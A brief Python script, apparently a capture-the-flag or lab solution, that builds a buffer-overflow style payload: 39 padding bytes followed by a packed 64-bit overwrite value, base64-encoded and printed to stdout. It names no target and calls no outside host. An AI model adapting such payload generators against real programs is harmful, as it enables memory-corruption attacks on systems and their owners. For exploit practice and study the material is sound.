
import sys
import struct
import base64

buf = b'nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn'
buf += struct.pack('<Q', 2423377154214539986)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
